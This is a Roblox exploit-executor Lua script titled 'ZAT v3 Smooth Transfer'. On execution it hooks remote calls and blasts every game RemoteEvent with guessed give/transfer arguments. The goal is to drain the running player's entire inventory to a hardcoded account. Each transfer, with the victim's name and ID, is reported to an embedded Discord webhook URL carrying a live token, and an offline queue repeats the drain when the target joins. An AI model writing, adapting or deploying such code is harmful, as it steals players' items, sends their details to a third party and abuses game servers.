-- ZAT v3 — smooth parallel fire · no freeze · per-item webhook · auto-run
-- Fix: 8-worker pool + task.wait() after each remote = game breathes every frame
-- Target: full transfer in <11s with zero freeze
-- ─────────────────────────────────────────────
local TARGET_USERNAME = "Realdrake_8080"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"
local WORKERS         = 8    -- parallel threads — raise only if you have headroom
local MAX_LOOPS       = 20   -- blast loops before giving up

-- ═══════════════════════════════════════════════
local LP  = game:GetService("Players").LocalPlayer
local PLR = game:GetService("Players")
local HS  = game:GetService("HttpService")
local TW  = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local WS  = game:GetService("Workspace")
local RS  = game:GetService("ReplicatedStorage")

local httpfn=(syn and syn.request) or (http and http.request) or request
local function fetch(u,m,h,b)
    if not httpfn then return nil end
    local ok,r=pcall(httpfn,{Url=u,Method=m or "GET",Headers=h or {},Body=b})
    return ok and r or nil
end
local function jd(s) local ok,v=pcall(HS.JSONDecode,HS,s);return ok and v or nil end
local function je(t) local ok,v=pcall(HS.JSONEncode,HS,t);return ok and v or nil end
local function ts()  return os.date("!%H:%M:%S UTC") end

-- ═══════════════════════════════════════════════
-- RESOLVE
-- ═══════════════════════════════════════════════
local function resolveUser(u)
    local r=fetch("https://users.roblox.com/v1/usernames/users","POST",
        {["Content-Type"]="application/json"},
        je({usernames={u},excludeBannedUsers=false}))
    if not r or r.StatusCode~=200 then return nil,nil end
    local d=jd(r.Body)
    if d and d.data and d.data[1] then return d.data[1].id,d.data[1].name end
    return nil,nil
end

-- ═══════════════════════════════════════════════
-- WEBHOOKS  (queued — respects Discord rate limit)
-- ═══════════════════════════════════════════════
local wQueue={}; local wBusy=false
local gname="Unknown"; local sender=LP.Name; local senderID=LP.UserId
local startTick=tick(); local movedCount=0

local function pushWebhook(payload)
    if DISCORD_WEBHOOK=="" then return end
    wQueue[#wQueue+1]=payload
    if not wBusy then
        wBusy=true
        task.spawn(function()
            while #wQueue>0 do
                local p=table.remove(wQueue,1)
                fetch(DISCORD_WEBHOOK,"POST",{["Content-Type"]="application/json"},je(p))
                task.wait(0.65)
            end
            wBusy=false
        end)
    end
end

local function whItem(name,tn,tid)
    pushWebhook({username="ZAT Transfer",embeds={{
        title="📦 Item Transferred",color=3066993,
        fields={
            {name="Item",  value="`"..name.."`",             inline=true},
            {name="To",    value=tn.." (`"..tid.."`)",       inline=true},
            {name="From",  value=sender.." (`"..senderID.."`)", inline=true},
            {name="Game",  value=gname,                      inline=true},
            {name="Clock", value=ts(),                       inline=true},
        },
    }}})
end

local function whSummary(items,tn,tid)
    local ns={}; for _,it in ipairs(items) do ns[#ns+1]="`"..it.name.."`" end
    local elapsed=string.format("%.1fs",tick()-startTick)
    pushWebhook({username="ZAT Transfer",embeds={{
        title="✅ Transfer Complete — Inventory Empty",
        color=5763719,
        description="All items transferred from **"..sender.."** to **"..tn.."**.",
        fields={
            {name="From",     value=sender.." (`"..senderID.."`)",    inline=true},
            {name="To",       value=tn.." (`"..tid.."`)",             inline=true},
            {name="Game",     value=gname,                            inline=false},
            {name="Items ("..#items..")", value=table.concat(ns," · "),inline=false},
            {name="Duration", value=elapsed,                          inline=true},
            {name="Status",   value="✅ Inventory empty",             inline=true},
        },
        footer={text="ZAT v3 · "..os.date("!%Y-%m-%d %H:%M UTC")},
    }}})
end

-- ═══════════════════════════════════════════════
-- INVENTORY
-- ═══════════════════════════════════════════════
local function scanInv()
    local out,seen={},{}
    local function add(n,o,c)
        local k=tostring(n)..tostring(o)
        if seen[k] then return end; seen[k]=true; out[#out+1]={name=n,obj=o,cat=c}
    end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Tool") end end end
    local ch=LP.Character
    if ch then for _,v in ipairs(ch:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Eq") end end end
    local ls=LP:FindFirstChild("leaderstats")
    if ls then for _,v in ipairs(ls:GetChildren()) do
        if v.Value and v.Value~=0 and v.Value~="" then add(v.Name.."="..tostring(v.Value),v,"Stat") end
    end end
    local aok,at=pcall(function() return LP:GetAttributes() end)
    if aok and type(at)=="table" then for k,v in pairs(at) do
        if type(v)=="number" and v>0 then add(k.." x"..v,LP,"Attr") end
    end end
    for _,c in ipairs(LP:GetChildren()) do
        if (c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") or c:IsA("BoolValue"))
        and c.Name:lower()~="userid" then add(c.Name.."="..tostring(c.Value),c,"Val") end
    end
    for _,f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then for _,c in ipairs(f:GetDescendants()) do
            if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
            and c.Value~=0 and c.Value~="" then add(f.Name.."/"..c.Name,c,"Folder") end
        end end
    end
    local pg=LP:FindFirstChild("PlayerGui")
    if pg then for _,d in ipairs(pg:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text~="" and d.Text~="0" then
            local pn=d.Parent and d.Parent.Name:lower() or ""
            if pn:find("slot") or pn:find("item") or pn:find("inv")
            or pn:find("seed") or pn:find("fruit") or pn:find("pet") then
                add(d.Text,d,"Slot") end
        end
    end end
    for _,root in ipairs({
        WS:FindFirstChild(LP.Name),WS:FindFirstChild("Plots"),WS:FindFirstChild("Gardens"),
        WS:FindFirstChild("Farms"),WS:FindFirstChild("Inventory"),WS:FindFirstChild("Seeds"),
        WS:FindFirstChild("Storage"),WS:FindFirstChild("Crops"),WS:FindFirstChild("Fruits"),
    }) do if root then
        local sub=root:FindFirstChild(LP.Name) or root
        for _,c in ipairs(sub:GetDescendants()) do
            if c:IsA("Tool") or c:IsA("Model") then add(c.Name,c,"World") end
        end
    end end
    local rsp=RS:FindFirstChild(LP.Name) or RS:FindFirstChild("PlayerData")
    if rsp then for _,c in ipairs(rsp:GetDescendants()) do
        if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
        and c.Value~=0 then add(c.Name,c,"RS") end
    end end
    return out
end

local function curNames()
    local t={}; for _,it in ipairs(scanInv()) do t[it.name]=true end; return t
end
local function isEmpty(orig)
    local cur=curNames()
    for _,it in ipairs(orig) do if cur[it.name] then return false end end
    return true
end

-- ═══════════════════════════════════════════════
-- HOOKMETAMETHOD
-- ═══════════════════════════════════════════════
local captured={}; local hookOn=false
local GKWS={"give","transfer","send","trade","gift","grant","deliver",
    "deposit","item","seed","fruit","pet","crop","inv","bulk","offline","data","save"}
local function scoreNm(nm)
    local n,s=nm:lower(),0
    for _,k in ipairs(GKWS) do if n:find(k) then s=s+1 end end; return s
end
local function startHook()
    if not hookmetamethod then return false end
    hookOn=true; local orig
    orig=hookmetamethod(game,"__namecall",function(self,...)
        local m=getnamecallmethod()
        if hookOn and (m=="FireServer" or m=="InvokeServer")
        and (self:IsA("RemoteEvent") or self:IsA("RemoteFunction")) then
            local nm=self.Name; local args={...}; local sc=scoreNm(nm)
            for _,a in ipairs(args) do
                if type(a)=="userdata" then sc=sc+3
                elseif type(a)=="number" and a>100000 and a~=LP.UserId then sc=sc+5 end
            end
            if sc>0 then
                if not captured[nm] then captured[nm]={sc=sc,calls={},rem=self} end
                local sig=tostring(#args); local ex=false
                for _,c in ipairs(captured[nm].calls) do if c.sig==sig then ex=true;c.n=c.n+1;break end end
                if not ex then captured[nm].calls[#captured[nm].calls+1]={args=args,sig=sig,n=1,m=m} end
            end
        end
        return orig(self,...)
    end); return true
end
local function stopHook() hookOn=false end

-- ═══════════════════════════════════════════════
-- ARG SETS  (~25 patterns — focused, not exhaustive)
-- Keeping this trim is what prevents the freeze
-- ═══════════════════════════════════════════════
local function buildArgs(tid,tn,tp,items,names)
    local A={}
    local function a(...) A[#A+1]={...} end
    local function d(t)   A[#A+1]=t     end

    -- bulk: all items at once
    a(tid,items);  a(tid,names);  a(tn,items);  a(tn,names)
    a(tostring(tid),items)
    if tp then a(tp,items); a(tp,names); a(tp) end
    d({userId=tid,items=items,save=true})
    d({userId=tid,items=names,amount="all"})
    d({to=tid,items=items,qty="all"})
    d({targetId=tid,itemList=names,save=true})

    -- give-all (no item — server gives everything)
    a(tid); a(tn); a(tostring(tid))
    d({userId=tid,save=true}); d({to=tid}); d({targetId=tid})
    if tp then a(tp) end

    -- per-item: 6 patterns each (trimmed from 20 — most likely to match)
    for _,it in ipairs(items) do
        local n,o=it.name,it.obj
        a(tid,n,1)
        a(tn,n,1)
        if tp then a(tp,n) end
        d({userId=tid,   item=n,amount=1,save=true})
        d({username=tn,  item=n,amount=1})
        d({to=tid,       item=n,qty=1})
        d({targetId=tid, itemName=n,amount=1})
        d({userId=tid,   fruit=n,amount=1})   -- BF
        d({userId=tid,   seed=n, count=1})    -- GAG
        d({userId=tid,   pet=n,  amount=1})   -- pet sims
    end

    -- captured hook patterns (swapped to target)
    local sorted={}
    for nm,data in pairs(captured) do sorted[#sorted+1]={nm=nm,data=data} end
    table.sort(sorted,function(a,b) return a.data.sc>b.data.sc end)
    for _,entry in ipairs(sorted) do
        local rem=entry.data.rem; if not rem then continue end
        for _,call in ipairs(entry.data.calls) do
            for _,it in ipairs(items) do
                local sw={}
                for _,arg in ipairs(call.args) do
                    if type(arg)=="number" and arg==LP.UserId then sw[#sw+1]=tid
                    elseif type(arg)=="string" and tostring(LP.UserId)==arg then sw[#sw+1]=tostring(tid)
                    elseif type(arg)=="string" and arg==LP.Name then sw[#sw+1]=tn
                    elseif type(arg)=="userdata" then sw[#sw+1]=tp or tid
                    else sw[#sw+1]=arg end
                end
                -- fire direct on the captured remote
                A[#A+1]={_rem=rem,_fn=call.m=="InvokeServer",_args=sw}
                local wi={}; for _,v in ipairs(sw) do wi[#wi+1]=v end; wi[#wi+1]=it.name
                A[#A+1]={_rem=rem,_fn=call.m=="InvokeServer",_args=wi}
            end
        end
    end

    return A
end

-- ═══════════════════════════════════════════════
-- FIRE ONE ENTRY × ONE ARG SET
-- ═══════════════════════════════════════════════
local function fireOne(entry,a)
    if a._rem then
        pcall(function()
            if a._fn then a._rem:InvokeServer(table.unpack(a._args))
            else           a._rem:FireServer(table.unpack(a._args)) end
        end)
        return
    end
    local isDict=false
    for k in pairs(a) do if type(k)~="number" then isDict=true;break end end
    pcall(function()
        if isDict then
            if entry.fn then entry.r:InvokeServer(a) else entry.r:FireServer(a) end
        else
            if entry.fn then entry.r:InvokeServer(table.unpack(a))
            else              entry.r:FireServer(table.unpack(a)) end
        end
    end)
end

-- ═══════════════════════════════════════════════
-- SMOOTH PARALLEL BLAST
-- 8 workers share a remote queue.
-- Each worker: fire all arg sets for one remote,
-- then task.wait() — yields 1 frame — keeps game alive.
-- ═══════════════════════════════════════════════
local function smoothBlast(remotes,argSets,firedRef,logFn)
    local queue={table.unpack(remotes)}
    local qi=0; local lock=false

    local function pop()
        while lock do task.wait() end
        lock=true; qi=qi+1; local e=queue[qi]; lock=false; return e
    end

    local alive=0
    local function worker()
        alive=alive+1
        while true do
            local entry=pop(); if not entry then break end
            -- fire all arg sets for this remote (no yield between args — pcall is fast)
            for _,a in ipairs(argSets) do fireOne(entry,a) end
            if firedRef then firedRef[1]=firedRef[1]+1 end
            task.wait()  -- ← yield 1 frame after each remote → game stays alive
        end
        alive=alive-1
    end

    -- spawn fixed pool — NOT one per remote
    for i=1,math.min(WORKERS,#remotes) do task.spawn(worker) end

    -- wait for pool to finish (14s cap)
    local cap=tick()+14
    while alive>0 and tick()<cap do task.wait(0.1) end
    if logFn then logFn("Blast done — "..firedRef[1].." remotes fired","ok") end
end

-- ═══════════════════════════════════════════════
-- COLLECT + PRIORITIZE REMOTES
-- ═══════════════════════════════════════════════
local KNOWN={
    "GiveItem","TransferItem","SendItem","GiftItem","GiveSeed","TransferSeed","GivePet",
    "TransferPet","GiveCrop","TransferCrop","GiveFruit","TransferFruit","GiveToPlayer",
    "PlayerGive","ItemTransfer","TradeItem","RequestTrade","AcceptTrade","Give","Transfer",
    "Send","Gift","BulkGive","GiveAll","TransferAll","OfflineGive","DataGive","SaveGive",
    "InventoryGive","InventoryTransfer","GiveUnit","SendUnit","GiveGear","GiveCurrency",
    "GiveV2","TransferV2","DatastoreGive","SaveTransfer","GiveWeapon","GiveKnife","GiveFruit",
    "StoreFruit","FruitGive","StoreInSafe","FruitSafe","AddItem","DepositItem","OfferItem",
}
local function collectRemotes()
    local all,seen={},{}
    local knownSet={}; for _,n in ipairs(KNOWN) do knownSet[n:lower()]=true end
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local fp=v:GetFullName()
            if not seen[fp] then
                seen[fp]=true
                local pri=knownSet[v.Name:lower()] and 3 or scoreNm(v.Name)
                all[#all+1]={r=v,nm=v.Name,fn=v.ClassName=="RemoteFunction",pri=pri}
            end
        end
    end
    table.sort(all,function(a,b) return a.pri>b.pri end)
    return all
end

-- ═══════════════════════════════════════════════
-- OFFLINE QUEUE
-- ═══════════════════════════════════════════════
local offQ={}
PLR.PlayerAdded:Connect(function(player)
    for i=#offQ,1,-1 do
        local job=offQ[i]
        if player.UserId==job.tid then
            task.spawn(function()
                task.wait(2)
                local names={}; for _,it in ipairs(job.items) do names[#names+1]=it.name end
                local rems=collectRemotes()
                local args=buildArgs(job.tid,job.tn,player,job.items,names)
                local fr={0}
                smoothBlast(rems,args,fr,nil)
                table.remove(offQ,i)
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════
-- UI
-- ═══════════════════════════════════════════════
local C={
    bg=Color3.fromRGB(10,10,15),    panel=Color3.fromRGB(17,17,24),
    bar=Color3.fromRGB(23,23,32),   accent=Color3.fromRGB(76,52,242),
    green=Color3.fromRGB(35,198,68),red=Color3.fromRGB(242,48,48),
    yellow=Color3.fromRGB(242,175,25),white=Color3.fromRGB(210,210,222),
    grey=Color3.fromRGB(92,92,112), border=Color3.fromRGB(30,30,44),
    teal=Color3.fromRGB(28,175,155),orange=Color3.fromRGB(242,120,22),
}
local function mk(c,p) local o=Instance.new(c);for k,v in pairs(p or {}) do o[k]=v end;return o end
local function corner(r,p) mk("UICorner",{CornerRadius=UDim.new(0,r),Parent=p}) end
local function stroke(c,t,p) mk("UIStroke",{Color=c,Thickness=t,Parent=p}) end

local SG=mk("ScreenGui",{Name="ZAT_V3",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
pcall(function() SG.Parent=game:GetService("CoreGui") end)
if not SG.Parent then SG.Parent=LP.PlayerGui end

local WIN=mk("Frame",{Parent=SG,Size=UDim2.new(0,355,0,455),
    Position=UDim2.new(0.5,-177,0.5,-227),BackgroundColor3=C.bg,BorderSizePixel=0,ClipsDescendants=true})
corner(12,WIN); stroke(C.border,1,WIN)

-- title
local TB=mk("Frame",{Parent=WIN,Size=UDim2.new(1,0,0,38),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(12,TB)
mk("Frame",{Parent=TB,Size=UDim2.new(1,0,0.5,0),Position=UDim2.new(0,0,0.5,0),BackgroundColor3=C.panel,BorderSizePixel=0})
mk("TextLabel",{Parent=TB,Text="⚡  ZAT v3  —  Smooth Transfer",TextSize=13,Font=Enum.Font.GothamBold,
    TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(1,-50,1,0),
    Position=UDim2.new(0,14,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local SDOT=mk("Frame",{Parent=TB,Size=UDim2.new(0,9,0,9),
    Position=UDim2.new(1,-18,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),
    BackgroundColor3=C.grey,BorderSizePixel=0}); corner(9,SDOT)

-- drag
local dg,ds,sp=false,nil,nil
TB.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=true;ds=i.Position;sp=WIN.Position end
end)
UIS.InputChanged:Connect(function(i)
    if dg and i.UserInputType==Enum.UserInputType.MouseMovement then
        local d=i.Position-ds
        WIN.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=false end end)

-- stats
local SR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,46),Position=UDim2.new(0,10,0,46),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(8,SR); stroke(C.border,1,SR)
local sv={}
local function sbox(lbl,val,x,w)
    w=w or 82
    local f=mk("Frame",{Parent=SR,Size=UDim2.new(0,w,1,0),Position=UDim2.new(0,x,0,0),BackgroundTransparency=1})
    mk("TextLabel",{Parent=f,Text=lbl,TextSize=9,Font=Enum.Font.Gotham,TextColor3=C.grey,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,14),Position=UDim2.new(0,8,0,4),TextXAlignment=Enum.TextXAlignment.Left})
    local v=mk("TextLabel",{Parent=f,Text=val,TextSize=15,Font=Enum.Font.GothamBold,TextColor3=C.white,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,22),Position=UDim2.new(0,8,0,17),TextXAlignment=Enum.TextXAlignment.Left})
    return v
end
sv.rem=sbox("REMOTES","—",0)
sv.args=sbox("ARG SETS","—",84)
sv.fired=sbox("FIRED","0",168)
sv.moved=sbox("MOVED","0",252)

-- timer bar
local TBARBG=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,4),Position=UDim2.new(0,10,0,100),BackgroundColor3=C.bar,BorderSizePixel=0}); corner(3,TBARBG)
local TBARFG=mk("Frame",{Parent=TBARBG,Size=UDim2.new(0,0,1,0),BackgroundColor3=C.accent,BorderSizePixel=0}); corner(3,TBARFG)
local activeTween=nil
local function startTimer(dur,col)
    if activeTween then activeTween:Cancel() end
    TBARFG.Size=UDim2.new(0,0,1,0)
    TBARFG.BackgroundColor3=col or C.accent
    activeTween=TW:Create(TBARFG,TweenInfo.new(dur,Enum.EasingStyle.Linear),{Size=UDim2.new(1,0,1,0)})
    activeTween:Play()
end

-- phase label
local PHASE=mk("TextLabel",{Parent=WIN,Text="⏳ Starting...",TextSize=11,Font=Enum.Font.GothamBold,
    TextColor3=C.accent,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,14),
    Position=UDim2.new(0,10,0,109),TextXAlignment=Enum.TextXAlignment.Left})
local function setPhase(t,c) PHASE.Text=t; PHASE.TextColor3=c or C.accent end

-- item list
mk("TextLabel",{Parent=WIN,Text="📦 INVENTORY",TextSize=9,Font=Enum.Font.GothamBold,TextColor3=C.grey,
    BackgroundTransparency=1,Size=UDim2.new(0,162,0,12),Position=UDim2.new(0,10,0,130)})
local IBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,160,0,222),Position=UDim2.new(0,10,0,144),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,IBOX); stroke(C.border,1,IBOX)
local ISC=mk("ScrollingFrame",{Parent=IBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=ISC,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,1)})
local irows={}
local function renderItems(items)
    for _,c in ipairs(ISC:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
    irows={}
    for i,it in ipairs(items) do
        local r=mk("TextLabel",{Parent=ISC,Text="·  "..it.name,TextSize=10,Font=Enum.Font.Code,
            TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(1,-8,0,14),
            Position=UDim2.new(0,6,0,0),TextXAlignment=Enum.TextXAlignment.Left,
            TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=i})
        irows[it.name]=r
    end
end
local function markMoved(name)
    movedCount=movedCount+1
    sv.moved.Text=tostring(movedCount)
    local r=irows[name]
    if r then TW:Create(r,TweenInfo.new(0.25),{TextColor3=C.green}):Play(); r.Text="✓  "..name end
    TW:Create(SDOT,TweenInfo.new(0.2),{BackgroundColor3=C.green}):Play()
end

-- log
mk("TextLabel",{Parent=WIN,Text="📋 LOG",TextSize=9,Font=Enum.Font.GothamBold,TextColor3=C.grey,
    BackgroundTransparency=1,Size=UDim2.new(0,175,0,12),Position=UDim2.new(0,182,0,130)})
local LBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,163,0,222),Position=UDim2.new(0,182,0,144),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,LBOX); stroke(C.border,1,LBOX)
local LSC=mk("ScrollingFrame",{Parent=LBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=LSC,SortOrder=Enum.SortOrder.LayoutOrder})
local lo=0
local function log(msg,kind)
    local cols={ok=C.green,err=C.red,warn=C.yellow,info=C.white,step=C.accent,done=C.green,fire=C.orange}
    local icons={ok="✓",err="✗",warn="!",info="→",step="■",done="★",fire="🔥"}
    local col=cols[kind or "info"] or C.grey
    local txt="["..(icons[kind or "info"] or "→").."] "..tostring(msg)
    lo=lo+1
    mk("TextLabel",{Parent=LSC,Text=txt,TextSize=10,Font=Enum.Font.Code,TextColor3=col,
        BackgroundTransparency=1,Size=UDim2.new(1,-8,0,13),
        TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=lo})
    task.defer(function() LSC.CanvasPosition=Vector2.new(0,LSC.AbsoluteCanvasSize.Y) end)
    local ch=LSC:GetChildren(); if #ch>90 then for i=1,#ch-80 do if ch[i]:IsA("TextLabel") then ch[i]:Destroy() end end end
    setPhase(txt,col); print(txt)
end

-- bottom bar
local BBAR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,28),Position=UDim2.new(0,10,1,-38),
    BackgroundColor3=C.panel,BorderSizePixel=0}); corner(8,BBAR); stroke(C.border,1,BBAR)
local BTEXT=mk("TextLabel",{Parent=BBAR,Text="⏳ Initializing...",TextSize=11,
    Font=Enum.Font.GothamBold,TextColor3=C.accent,BackgroundTransparency=1,
    Size=UDim2.new(1,-16,1,0),Position=UDim2.new(0,10,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local function setBar(t,c) BTEXT.Text=t; BTEXT.TextColor3=c or C.accent end
local function setDot(c) TW:Create(SDOT,TweenInfo.new(0.2),{BackgroundColor3=c}):Play() end

-- ═══════════════════════════════════════════════
-- MAIN  — auto-fires on execute
-- ═══════════════════════════════════════════════
task.spawn(function()
    setBar("⏳ Starting...",C.accent)

    if not httpfn then
        log("HTTP not found — enable in Delta settings","err")
        setBar("✗ HTTP missing — enable in Delta",C.red); return
    end
    log("HTTP ok","ok")

    pcall(function()
        gname=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or gname
    end)
    log("Game: "..gname,"info")

    local hkOn=startHook()
    if hkOn then setDot(C.teal); log("hookmetamethod: ACTIVE","ok")
    else setDot(C.yellow); log("hookmetamethod: unavailable (fallback)","warn") end

    setBar("⏳ Resolving "..TARGET_USERNAME,C.accent)
    log("Resolving "..TARGET_USERNAME,"info")
    local tid,tn=resolveUser(TARGET_USERNAME)
    if not tid then
        log("Cannot resolve '"..TARGET_USERNAME.."'","err")
        setBar("✗ Cannot resolve username",C.red); return
    end
    if tid==LP.UserId then log("Target = sender","err"); setBar("✗ Same account",C.red); return end
    log("Target: "..tn.." ("..tid..")","ok")

    local tp=PLR:GetPlayerByUserId(tid)
    log(tp and "Target ONLINE" or "Target OFFLINE — DataStore paths active","warn")

    log("Scanning inventory...","info"); setBar("⏳ Scanning...",C.accent)
    local items=scanInv()
    sv.rem.Text=tostring(#items)
    if #items==0 then
        log("No items found — make sure you are in-game","warn")
        setBar("! No items found",C.yellow); return
    end
    log("Found "..#items.." items","ok"); renderItems(items)

    log("Collecting remotes...","info")
    local remotes=collectRemotes()
    sv.args.Text=tostring(#remotes)
    log("Remotes: "..#remotes,"ok")

    local names={}; for _,it in ipairs(items) do names[#names+1]=it.name end

    offQ[#offQ+1]={tid=tid,tn=tn,items=items}
    log("Offline queue armed","ok")

    -- drain watcher — per-item webhook on each move
    local drained={}
    task.spawn(function()
        while true do
            local cur=curNames()
            for _,it in ipairs(items) do
                if not cur[it.name] and not drained[it.name] then
                    drained[it.name]=true
                    log("MOVED: "..it.name,"done"); markMoved(it.name)
                    task.spawn(function() whItem(it.name,tn,tostring(tid)) end)
                end
            end
            task.wait(0.3)
        end
    end)

    -- ═══════════════════════════════════════════
    -- BLAST LOOP — smooth, yields every remote
    -- ═══════════════════════════════════════════
    local firedRef={0}; local loop=0

    while not isEmpty(items) and loop<MAX_LOOPS do
        loop=loop+1

        tp=PLR:GetPlayerByUserId(tid)
        local argSets=buildArgs(tid,tn,tp,items,names)
        sv.fired.Text=tostring(firedRef[1])

        local txt="🔥 Blast "..loop.." — "..#remotes.." remotes · "..#argSets.." args · "..WORKERS.." workers"
        setBar(txt,C.orange); log(txt,"fire")
        startTimer(11,C.accent)

        smoothBlast(remotes,argSets,firedRef,log)
        sv.fired.Text=tostring(firedRef[1])

        if not isEmpty(items) then
            log("Loop "..loop.." done — waiting 2s","info")
            task.wait(2)
        end
    end

    -- ═══════════════════════════════════════════
    -- DONE
    -- ═══════════════════════════════════════════
    stopHook()
    if activeTween then activeTween:Cancel() end
    TBARFG.Size=UDim2.new(1,0,1,0)
    TW:Create(TBARFG,TweenInfo.new(0.3),{BackgroundColor3=C.green}):Play()
    setDot(C.green)
    setBar("✅ ALL TRANSFERRED — inventory empty",C.green)
    log("SUCCESS — "..movedCount.." items · "..loop.." loops · "..firedRef[1].." fires","done")
    log("Log into "..tn.." and join this game","info")

    task.spawn(function()
        task.wait(math.min(movedCount*0.7,8))
        whSummary(items,tn,tostring(tid))
    end)
end)
